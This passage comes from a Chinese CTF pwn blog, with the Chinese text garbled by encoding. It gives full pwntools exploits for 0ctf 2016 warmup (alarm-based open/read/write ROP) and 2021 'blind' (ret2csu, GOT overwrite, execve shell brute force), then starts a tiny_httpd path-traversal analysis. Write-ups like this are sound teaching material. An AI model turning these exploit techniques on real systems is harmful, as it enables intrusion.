<h2 id="Sropè¿›é˜¶"><a href="#Sropè¿›é˜¶" class="headerlink" title="Sropè¿›é˜¶"></a>Sropè¿›é˜¶</h2><p>åœ¨ä¸€äº›å †çš„åˆ©ç”¨ä¸­ï¼Œä¸€èˆ¬ä¼šç”¨setcontext+xxçš„ä½ç½®æ¥å®ŒæˆSROPæ¥è¿›è¡Œorwï¼Œåœ¨glibc2.27ç‰ˆæœ¬åŠä¸€ä¸‹ä¸€èˆ¬æ˜¯setcontext+53ï¼Œ2.3+ç‰ˆæœ¬ä¸€èˆ¬ä¸ºsetcontext+61åœ¨åç»­çš„ä¸€äº›é«˜ç‰ˆæœ¬glibcåˆ©ç”¨æ–¹å¼çš„ä¸­ä¼šè¯¦ç»†ä»‹ç»ã€‚</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.bilibili.com/video/BV1Uv411j7fr?p=11">https://www.bilibili.com/video/BV1Uv411j7fr?p=11</a><br><a href="https://www.anquanke.com/post/id/85810">https://www.anquanke.com/post/id/85810</a><br><a href="http://blog.eonew.cn/archives/975">http://blog.eonew.cn/archives/975</a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>ç¬”è®°</tag>
      </tags>
  </entry>
  <entry>
    <title>æ¯æ—¥ä¸€pwn</title>
    <url>/2021/11/21/%E6%AF%8F%E6%97%A5%E4%B8%80pwn/</url>
    <content><![CDATA[<p><img src="https://gitee.com/Nss-harukii/images/raw/master/44.jpg" alt=""><br><span id="more"></span></p>
<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç”¨æ¥è®°å½•ä¸€äº›è®©æˆ‘å­¦åˆ°æ–°ä¸œè¥¿çš„é¢˜ï¼Œwpå°½é‡è¯¦ç»†ï¼Œä¹Ÿæ˜¯ä»¥ä¸€ä¸ªæ—¥å¿—çš„å½¢å¼æ¥è®°å½•å­¦ä¹ è¿‡ç¨‹</p>
<h2 id="2021-11-21"><a href="#2021-11-21" class="headerlink" title="2021-11-21"></a>2021-11-21</h2><h3 id="0ctf-2016-warmup"><a href="#0ctf-2016-warmup" class="headerlink" title="0ctf 2016 warmup"></a>0ctf 2016 warmup</h3><p><a href="https://gitee.com/Nss-harukii/images/raw/master/warmup">é™„ä»¶</a></p>
<h4 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h4><p>è¿™é¢˜çš„æ¼æ´ç‚¹æ¯”è¾ƒæ˜æ˜¾ï¼Œå°±æ˜¯ä¸€ä¸ªç®€å•çš„æ ˆæº¢å‡º<br><img src="https://gitee.com/Nss-harukii/images/raw/master/2.png" alt="pic"></p>
<p>è¿™ä¸ªé¢˜å·§å¦™çš„åœ°æ–¹å°±åœ¨äºå®ƒçš„åˆ©ç”¨æ–¹å¼ï¼Œè¿™ä¸ªé¢˜åˆ©ç”¨äº†alarmå‡½æ•°çš„æ€§è´¨ï¼š <strong>å¦‚æœåœ¨ä¸€æ¬¡ç¨‹åºæ‰§è¡Œçš„è¿‡ç¨‹ä¸­å¤šæ¬¡è°ƒç”¨alarmå‡½æ•°ï¼Œé‚£ä¹ˆalarmå°±ä¼šè¿”å›å‰ä¸€ä¸ªalarmä»å¼€å§‹åˆ°ç°åœ¨è¿˜å‰©ä¸‹å¤šé•¿æ—¶é—´ï¼Œå¹¶ä¸”å°†è¿™ä¸ªå€¼èµ‹å€¼ç»™eaxå¯„å­˜å™¨</strong>ã€‚</p>
<p>åˆ©ç”¨è¿™æ¡æ€§è´¨æˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶raxå¯„å­˜å™¨çš„å€¼</p>
<p>é‚£ä¹ˆé¢˜ç›®çš„æ€è·¯å°±æ¯”è¾ƒæ˜¾è€Œæ˜“è§äº†</p>
<p>ç”±äºç¨‹åºä¸­å­˜åœ¨<code>alarm(0xA)</code>,æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ§åˆ¶raxå€¼ä¸º10ä¸€ä¸‹çš„æ•°ï¼Œæˆ‘ä»¬è¿˜çŸ¥é“32ä½ä¸­opençš„ç³»ç»Ÿè°ƒç”¨å·ä¸º5ï¼Œå³æˆ‘ä»¬å¯ä»¥æ§åˆ¶eaxçš„å€¼ä¸º5æ¥è°ƒç”¨openå‡½æ•°ï¼Œå†é…åˆç¨‹åºä¸­ç»™å‡ºçš„readå’Œwriteï¼Œæˆ‘ä»¬å°±å¯ä»¥å®ç°orw</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/3.png" alt="pic"></p>
<h4 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h4><h5 id="Step1-å°†â€™-flagâ€™å­—ç¬¦ä¸²å†™å…¥åˆ°dataæ®µä¸Š"><a href="#Step1-å°†â€™-flagâ€™å­—ç¬¦ä¸²å†™å…¥åˆ°dataæ®µä¸Š" class="headerlink" title="Step1 å°†â€™./flagâ€™å­—ç¬¦ä¸²å†™å…¥åˆ°dataæ®µä¸Š"></a>Step1 å°†â€™./flagâ€™å­—ç¬¦ä¸²å†™å…¥åˆ°dataæ®µä¸Š</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>       <span class="comment">#padding</span></span><br><span class="line">payload1 += p32(sys_read)</span><br><span class="line">payload1 += p32(vuln)      <span class="comment">#ret_addr è¿™é‡ŒåŸæœ¬æƒ³è¿”å›mainå‡½æ•°çš„ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆå¡«mainå‡½æ•°ä¼šå´©æ‰</span></span><br><span class="line">payload1 += p32(<span class="number">0</span>)         <span class="comment">#fd è·å–é”®ç›˜è¾“å…¥</span></span><br><span class="line">payload1 += p32(flag_addr) <span class="comment">#buf</span></span><br><span class="line">payload1 += p32(<span class="number">0x10</span>)      <span class="comment">#nbytes</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Good Luck!&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;./flag\x00&quot;</span>)</span><br></pre></td></tr></table></figure>
<h5 id="Step2-æ„é€ open-â€˜-flagâ€™-0"><a href="#Step2-æ„é€ open-â€˜-flagâ€™-0" class="headerlink" title="Step2 æ„é€ open(â€˜./flagâ€™,0)"></a>Step2 æ„é€ open(â€˜./flagâ€™,0)</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sleep(<span class="number">5</span>)               <span class="comment"># 0xa-5 = 5 </span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">payload2 += p32(alarm) <span class="comment"># mov rax , 5</span></span><br><span class="line">payload2 += p32(set_ebx_ecx_edx_int80)  <span class="comment"># open</span></span><br><span class="line">payload2 += p32(vuln)       <span class="comment"># ret_addr</span></span><br><span class="line">payload2 += p32(flag_addr)  <span class="comment"># ./flag</span></span><br><span class="line">payload2 += p32(<span class="number">0</span>)          <span class="comment"># O_RDONLY</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Good Luck!&quot;</span>)</span><br></pre></td></tr></table></figure>
<h5 id="Step3-read-3-flag-0x20"><a href="#Step3-read-3-flag-0x20" class="headerlink" title="Step3 read(3,flag,0x20)"></a>Step3 read(3,flag,0x20)</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload3 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">payload3 += p32(sys_read)</span><br><span class="line">payload3 += p32(vuln)</span><br><span class="line">payload3 += p32(<span class="number">3</span>)               <span class="comment">#fd</span></span><br><span class="line">payload3 += p32(flag_addr+<span class="number">0x10</span>)  <span class="comment">#buf</span></span><br><span class="line">payload3 += p32(<span class="number">0x10</span>)            <span class="comment">#nbytes</span></span><br><span class="line">p.send(payload3)</span><br></pre></td></tr></table></figure>
<h5 id="Step4-write-1-flag-0x20"><a href="#Step4-write-1-flag-0x20" class="headerlink" title="Step4 write(1,flag,0x20)"></a>Step4 write(1,flag,0x20)</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&quot;Good Luck!&quot;</span>)</span><br><span class="line">payload4 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">payload4 += p32(sys_write)</span><br><span class="line">payload4 += p32(<span class="number">0</span>)              <span class="comment">#ret_addr</span></span><br><span class="line">payload4 += p32(<span class="number">1</span>)              <span class="comment">#fd</span></span><br><span class="line">payload4 += p32(flag_addr+<span class="number">0x10</span>) <span class="comment">#buf</span></span><br><span class="line">payload4 += p32(<span class="number">0x10</span>)           <span class="comment">#nbytes</span></span><br><span class="line">p.send(payload4)</span><br></pre></td></tr></table></figure>
<h4 id="å®Œæ•´exp"><a href="#å®Œæ•´exp" class="headerlink" title="å®Œæ•´exp"></a>å®Œæ•´exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;warmup&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">vuln = <span class="number">0x0804815A</span></span><br><span class="line">sys_write = <span class="number">0x08048135</span> </span><br><span class="line">sys_read = <span class="number">0x0804811D</span></span><br><span class="line">set_ebx_ecx_edx_int80 = <span class="number">0x08048122</span> </span><br><span class="line">alarm = <span class="number">0x0804810D</span> </span><br><span class="line">flag_addr = <span class="number">0x080491BC</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> </span><br><span class="line">payload1 += p32(sys_read)</span><br><span class="line">payload1 += p32(vuln)</span><br><span class="line">payload1 += p32(<span class="number">0</span>) <span class="comment">#fd</span></span><br><span class="line">payload1 += p32(flag_addr) <span class="comment">#buf</span></span><br><span class="line">payload1 += p32(<span class="number">0x10</span>)   <span class="comment">#nbytes</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Good Luck!&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;./flag\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">payload2 += p32(alarm) <span class="comment"># mov rax , 5</span></span><br><span class="line">payload2 += p32(set_ebx_ecx_edx_int80)  <span class="comment"># open</span></span><br><span class="line">payload2 += p32(vuln)</span><br><span class="line">payload2 += p32(flag_addr)  <span class="comment"># ./flag</span></span><br><span class="line">payload2 += p32(<span class="number">4</span>) </span><br><span class="line">p.send(payload2)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Good Luck!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">payload3 += p32(sys_read)</span><br><span class="line">payload3 += p32(vuln)</span><br><span class="line">payload3 += p32(<span class="number">0</span>) <span class="comment">#fd</span></span><br><span class="line">payload3 += p32(flag_addr+<span class="number">0x10</span>)  <span class="comment">#buf</span></span><br><span class="line">payload3 += p32(<span class="number">0x10</span>) <span class="comment">#nbytes</span></span><br><span class="line">p.send(payload3)</span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Good Luck!&quot;</span>)</span><br><span class="line">payload4 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">payload4 += p32(sys_write)</span><br><span class="line">payload4 += p32(<span class="number">0</span>)</span><br><span class="line">payload4 += p32(<span class="number">1</span>)  <span class="comment">#fd</span></span><br><span class="line">payload4 += p32(flag_addr+<span class="number">0x10</span>) <span class="comment">#buf</span></span><br><span class="line">payload4 += p32(<span class="number">0x10</span>) <span class="comment">#nbytes</span></span><br><span class="line">p.send(payload4)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/4.png" alt="pic"></p>
<h2 id="2021-11-22"><a href="#2021-11-22" class="headerlink" title="2021-11-22"></a>2021-11-22</h2><h3 id="2021-è¥¿æ¹–è®ºå‰‘-blind"><a href="#2021-è¥¿æ¹–è®ºå‰‘-blind" class="headerlink" title="[2021 è¥¿æ¹–è®ºå‰‘]blind"></a>[2021 è¥¿æ¹–è®ºå‰‘]blind</h3><p><a href="https://gitee.com/Nss-harukii/images/raw/master/blind">é™„ä»¶</a></p>
<h4 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h4><p>è¿™é¢˜çš„æ¼æ´ç‚¹æ¯”è¾ƒæ˜æ˜¾ï¼Œå°±æ˜¯ä¸€ä¸ªæ ˆæº¢å‡º</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/5.png" alt="pic"></p>
<p>è¿™é¢˜ä¸€å¼€å§‹çœ‹åˆ°æƒ³åˆ°çš„æ˜¯å»ç”¨syscallï¼Œç„¶åæ²¡æ‰¾åˆ°syscallåˆå»ç°å­¦ret2dlresolveæ¥åšï¼Œæäº†åŠå¤©æ²¡æå‡ºæ¥ã€‚èµ›åçœ‹å¸ˆå‚…ä»¬çš„wpæ‰çŸ¥é“å¯ä»¥ç”¨alarm_gotå»çˆ†ç ´å‡ºsyscallã€‚</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/6.png" alt="pic"></p>
<p>å¯ä»¥çœ‹åˆ°syscallä½äº<code>&lt;alarm+9&gt;</code>çš„ä½ç½®,æˆ‘ä»¬åªè¦é€šè¿‡ä¿®æ”¹alarmçš„gotè¡¨çš„ä½ä¸€ä½å°±å¯ä»¥å¾—åˆ°syscalläº†ï¼Œç”±äºè¿™é‡Œæ˜¯æœ¬åœ°çš„ç¯å¢ƒï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒè¯•æ¥è·å¾—è¿™ä¸ªåç§»ï¼Œè€Œç”±äºæˆ‘ä»¬æ²¡æœ‰è¿œç¨‹ç¯å¢ƒçš„libcï¼Œè¿™ä¸ªåç§»å°±éœ€è¦å»çˆ†ç ´äº†ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ret2csuæ¥ä¿®æ”¹alarm_gotçš„ä½ä½ä½¿å…¶æŒ‡å‘syscallï¼Œç„¶åå†åˆ©ç”¨readæ¥æ§åˆ¶raxå¯„å­˜å™¨ä¸º59ï¼Œç„¶åå»æ‰§è¡Œ59å·ç³»ç»Ÿè°ƒç”¨execve(â€˜/bin/shâ€™,0,0)æ¥getshell</p>
<h4 id="è§£é¢˜æ­¥éª¤-1"><a href="#è§£é¢˜æ­¥éª¤-1" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h4><h5 id="Step1-ret2csuæ¨¡æ¿å®šä¹‰"><a href="#Step1-ret2csuæ¨¡æ¿å®šä¹‰" class="headerlink" title="Step1 ret2csuæ¨¡æ¿å®šä¹‰"></a>Step1 ret2csuæ¨¡æ¿å®šä¹‰</h5><p>ret2csuè¦æ³¨æ„çš„æ˜¯ï¼Œrdiä¸ºç¬¬ä¸€ä¸ªå‚æ•°çš„å­˜æ”¾å¯„å­˜å™¨ï¼Œrsiä¸ºç¬¬äºŒä¸ªå‚æ•°ï¼Œrdxä¸ºç¬¬ä¸‰ä¸ªå‚æ•°ã€‚ï¼ˆç”±äºå¤ªä¹…æ²¡ç”¨ret2csuäº†ï¼Œå¯¼è‡´å¯„å­˜å™¨æé”™äº†è€Œè°ƒäº†åŠå¤©ï¼‰</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">r12,rdx,rsi,rdi</span>):</span></span><br><span class="line">	payload = p64(<span class="number">0x04007BA</span>)</span><br><span class="line">	payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(r12) + p64(rdi) + p64(rsi) +p64(rdx) + p64(<span class="number">0x04007A0</span>)</span><br><span class="line">	payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>  </span><br><span class="line">	<span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
<h5 id="Step2-ä¿®æ”¹alarm-got"><a href="#Step2-ä¿®æ”¹alarm-got" class="headerlink" title="Step2 ä¿®æ”¹alarm_got"></a>Step2 ä¿®æ”¹alarm_got</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span>+csu(read_got,<span class="number">0</span>,alarm_got,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">Â·Â·Â·Â·Â·Â·</span><br><span class="line">p.send(<span class="string">b&#x27;\x19&#x27;</span>) <span class="comment">#æœ¬åœ°è°ƒè¯•å‡ºæ¥çš„ï¼Œè¿œç¨‹éœ€è¦çˆ†ç ´</span></span><br></pre></td></tr></table></figure>
<h5 id="Step3-æ‰§è¡Œ59å·ç³»ç»Ÿè°ƒç”¨"><a href="#Step3-æ‰§è¡Œ59å·ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="Step3 æ‰§è¡Œ59å·ç³»ç»Ÿè°ƒç”¨"></a>Step3 æ‰§è¡Œ59å·ç³»ç»Ÿè°ƒç”¨</h5><p>æ­¤æ—¶æˆ‘ä»¬å·²ç»å¾—åˆ°äº†syscall,é‚£ä¹ˆæ¥ä¸‹æ¥éœ€è¦æ§åˆ¶raxçš„å€¼ä¸º59</p>
<p>è¿™é‡Œåˆæ˜¯ä¸€ä¸ªæˆ‘é€šè¿‡è¿™é“é¢˜å­¦åˆ°çš„ç‚¹ï¼š<strong>readå‡½æ•°ä¼šæŠŠraxçš„å€¼èµ‹å€¼æˆè¾“å…¥çš„é•¿åº¦</strong><br><img src="https://gitee.com/Nss-harukii/images/raw/master/7.png" alt="pic"></p>
<p>é‚£ä¹ˆåªè¦æ§åˆ¶æˆ‘ä»¬çš„è¾“å…¥é•¿åº¦ä¸º59å°±èƒ½ä½¿raxçš„å€¼ä¸º59</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload += csu(read_got,<span class="number">0</span>,elf.bss(<span class="number">0x100</span>),<span class="number">0x100</span>)  <span class="comment"># mov rax,59</span></span><br><span class="line">payload += csu(alarm_got,elf.bss(<span class="number">0x100</span>),<span class="number">0</span>,<span class="number">0</span>)     <span class="comment"># execve(&#x27;/bin/sh\x00&#x27;,0,0)</span></span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">59</span>,<span class="string">b&#x27;\x00&#x27;</span>))         <span class="comment"># read /bin/sh in bss </span></span><br></pre></td></tr></table></figure>
<h4 id="å®Œæ•´exp-1"><a href="#å®Œæ•´exp-1" class="headerlink" title="å®Œæ•´exp"></a>å®Œæ•´exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;blind&quot;</span>)</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">alarm_got = elf.got[<span class="string">&#x27;alarm&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">r12,rdx,rsi,rdi</span>):</span></span><br><span class="line">	payload = p64(<span class="number">0x04007BA</span>)</span><br><span class="line">	payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(r12) + p64(rdi) + p64(rsi) +p64(rdx) + p64(<span class="number">0x04007A0</span>)</span><br><span class="line">	payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span></span><br><span class="line">	<span class="keyword">return</span> payload</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">i</span>):</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		p = process(<span class="string">&quot;blind&quot;</span>)</span><br><span class="line">		payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span>+csu(read_got,<span class="number">0</span>,alarm_got,<span class="number">1</span>)</span><br><span class="line">		payload += csu(read_got,<span class="number">0</span>,elf.bss(<span class="number">0x100</span>),<span class="number">59</span>)</span><br><span class="line">		payload += csu(alarm_got,elf.bss(<span class="number">0x100</span>),<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">		<span class="comment">#gdb.attach(p,&quot;b * 0x4007a9&quot;)</span></span><br><span class="line">		sleep(<span class="number">3</span>)</span><br><span class="line">		p.send(payload)</span><br><span class="line">		sleep(<span class="number">0.5</span>)</span><br><span class="line">		p.send(<span class="built_in">chr</span>(i))</span><br><span class="line">		<span class="comment">#gdb.attach(p)</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="built_in">chr</span>(i))</span><br><span class="line">		sleep(<span class="number">0.5</span>)</span><br><span class="line">		p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">59</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">		p.sendline(<span class="string">&quot;echo yay&quot;</span>)</span><br><span class="line">		s = p.recv(<span class="number">3</span>)</span><br><span class="line">		<span class="keyword">if</span> s == <span class="string">b&#x27;yay&#x27;</span>:</span><br><span class="line">			p.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">			p.interactive()</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">	pwn(i)</span><br></pre></td></tr></table></figure>
<h2 id="2021-11-23"><a href="#2021-11-23" class="headerlink" title="2021-11-23"></a>2021-11-23</h2><h3 id="2021-æ¹–æ¹˜æ¯-tiny-httpd"><a href="#2021-æ¹–æ¹˜æ¯-tiny-httpd" class="headerlink" title="[2021 æ¹–æ¹˜æ¯] tiny_httpd"></a>[2021 æ¹–æ¹˜æ¯] tiny_httpd</h3><p><a href="https://gitee.com/Nss-harukii/images/raw/master/tiny_httpd.zip">é™„ä»¶</a></p>
<p>è¿™ç§ç±»å‹çš„webpwnç›®å‰ä¸ºæ­¢è§è¿‡3æ¬¡ï¼Œç¬¬ä¸€æ¬¡æ˜¯åœ¨å›½èµ›å†³èµ›BFé˜¶æ®µï¼ˆæ¯”èµ›ä¸­æ²¡æŠ½åˆ°ï¼‰ï¼Œç¬¬äºŒæ¬¡å®åœ¨å¹¿ä¸œçœå¼ºç½‘æ¯ä¸ªäººèµ›çš„å†³èµ›é¢˜ï¼ˆå½“æ—¶ç¾¤å‹åˆ†äº«çš„ï¼‰ï¼Œç¬¬ä¸‰æ¬¡å°±æ˜¯åœ¨ä»Šå¹´çš„æ¹–æ¹˜æ¯ã€‚</p>
<p>è¿™ç±»é¢˜å¤§æ¦‚å°±æ˜¯ç”¨Cå®ç°ä¸€ä¸ªå»ºè®®çš„httpæœåŠ¡å™¨ï¼Œè¿™é“é¢˜æ¯”è¾ƒé€‚åˆå…¥é—¨ï¼Œè¿™é¢˜çš„æ¼æ´æ¯”è¾ƒç®€å•ï¼Œä»£ç é‡è¾ƒå°‘ï¼ŒåŒæ—¶ä¹Ÿç»™å‡ºäº†æºç ã€‚</p>
<h4 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h4><p>é¦–å…ˆç°åœ¨æœ¬åœ°æ­å¥½ç¯å¢ƒï¼Œæˆ‘ç”¨çš„æ˜¯é¢˜ç›®ç»™å‡ºçš„dockerfileï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥åœ¨Ubuntu 18 çš„ç³»ç»Ÿä¸Šç›´æ¥è¿è¡Œ</p>
<p>ç¯å¢ƒèµ·å¥½ä¹‹åå¯ä»¥æœ¬åœ°è®¿é—®åˆ°è¿™æ ·ä¸€ä¸ªé¡µé¢<br><img src="https://gitee.com/Nss-harukii/images/raw/master/12.png" alt="pic"></p>
<p>æ¥ä¸‹æ¥åˆ†ææ ¸å¿ƒä»£ç httpd.c</p>
<p>æ¼æ´ä»£ç éƒ¨åˆ†å¦‚ä¸‹<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> len = <span class="built_in">strlen</span>(path);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>, j = <span class="number">0</span>; j &lt; len;) &#123;</span><br><span class="line">    <span class="keyword">if</span> (path[j] == <span class="string">&#x27;.&#x27;</span> &amp;&amp; path[j + <span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    path[i++] = path[j++];</span><br><span class="line">&#125;</span><br><span class="line">path[i++] = <span class="string">&#x27;\0&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<p>æˆ‘ä»¬åªéœ€è¦æ„é€ <code>.../</code>å°±èƒ½å®Œæˆç›®å½•ç©¿è¶Š,å»è®¿é—®ä»»æ„ç›®å½•</p>
<p>æˆ‘ä»¬å†æ¥çœ‹å…³äºè·¯å¾„å¤„ç†çš„éƒ¨åˆ†<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¦‚æœ path æ•°ç»„ä¸­çš„è¿™ä¸ªå­—ç¬¦ä¸²çš„æœ€åä¸€ä¸ªå­—ç¬¦æ˜¯ä»¥å­—ç¬¦ / ç»“å°¾çš„è¯ï¼Œå°±æ‹¼æ¥ä¸Šä¸€ä¸ª&quot;index.html&quot;çš„å­—ç¬¦ä¸²ã€‚é¦–é¡µçš„æ„æ€</span></span><br><span class="line"> <span class="keyword">if</span> (path[<span class="built_in">strlen</span>(path) - <span class="number">1</span>] == <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">  <span class="built_in">strcat</span>(path, <span class="string">&quot;index.html&quot;</span>);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//åœ¨ç³»ç»Ÿä¸Šå»æŸ¥è¯¢è¯¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span></span><br><span class="line"> <span class="keyword">if</span> (stat(path, &amp;st) == <span class="number">-1</span>) &#123;</span><br><span class="line">  <span class="comment">//å¦‚æœä¸å­˜åœ¨ï¼Œé‚£æŠŠè¿™æ¬¡ http çš„è¯·æ±‚åç»­çš„å†…å®¹(head å’Œ body)å…¨éƒ¨è¯»å®Œå¹¶å¿½ç•¥</span></span><br><span class="line">  <span class="keyword">while</span> ((numchars &gt; <span class="number">0</span>) &amp;&amp; <span class="built_in">strcmp</span>(<span class="string">&quot;\n&quot;</span>, buf))  <span class="comment">/* read &amp; discard headers */</span></span><br><span class="line">   numchars = get_line(client, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="comment">//ç„¶åè¿”å›ä¸€ä¸ªæ‰¾ä¸åˆ°æ–‡ä»¶çš„ response ç»™å®¢æˆ·ç«¯</span></span><br><span class="line">  not_found(client);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line">  <span class="comment">//æ–‡ä»¶å­˜åœ¨ï¼Œé‚£å»è·Ÿå¸¸é‡S_IFMTç›¸ä¸ï¼Œç›¸ä¸ä¹‹åçš„å€¼å¯ä»¥ç”¨æ¥åˆ¤æ–­è¯¥æ–‡ä»¶æ˜¯ä»€ä¹ˆç±»å‹çš„</span></span><br><span class="line">  <span class="comment">//S_IFMTå‚è¯»ã€ŠTLPIã€‹P281ï¼Œä¸ä¸‹é¢çš„ä¸‰ä¸ªå¸¸é‡ä¸€æ ·æ˜¯åŒ…å«åœ¨&lt;sys/stat.h&gt;</span></span><br><span class="line">  <span class="keyword">if</span> ((st.st_mode &amp; S_IFMT) == S_IFDIR)  </span><br><span class="line">   <span class="comment">//å¦‚æœè¿™ä¸ªæ–‡ä»¶æ˜¯ä¸ªç›®å½•ï¼Œé‚£å°±éœ€è¦å†åœ¨ path åé¢æ‹¼æ¥ä¸€ä¸ª&quot;/index.html&quot;çš„å­—ç¬¦ä¸²</span></span><br><span class="line">   <span class="built_in">strcat</span>(path, <span class="string">&quot;/index.html&quot;</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">//S_IXUSR, S_IXGRP, S_IXOTHä¸‰è€…å¯ä»¥å‚è¯»ã€ŠTLPIã€‹P295</span></span><br><span class="line">  <span class="keyword">if</span> ((st.st_mode &amp; S_IXUSR) ||       </span><br><span class="line">      (st.st_mode &amp; S_IXGRP) ||</span><br><span class="line">      (st.st_mode &amp; S_IXOTH)    )</span><br><span class="line">   <span 